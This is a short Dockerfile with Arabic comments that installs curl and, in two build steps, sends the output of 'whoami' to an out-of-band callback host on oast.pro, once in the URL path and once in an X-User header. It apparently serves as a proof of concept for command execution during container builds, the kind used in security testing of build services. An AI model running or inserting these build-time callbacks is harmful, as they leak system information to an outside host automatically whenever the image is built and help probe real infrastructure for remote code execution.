FROM alpine:latest

RUN apk add --no-cache curl

# بنستخدم sh -c عشان نضمن إن الـ Shell هو اللي يفك المتغيرات
RUN /bin/sh -c "curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/\`whoami\`"

# وبنبعت الهيدر كمان للتأكيد
RUN /bin/sh -c "curl -H \"X-User: \`whoami\`\" http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/header_confirmed"
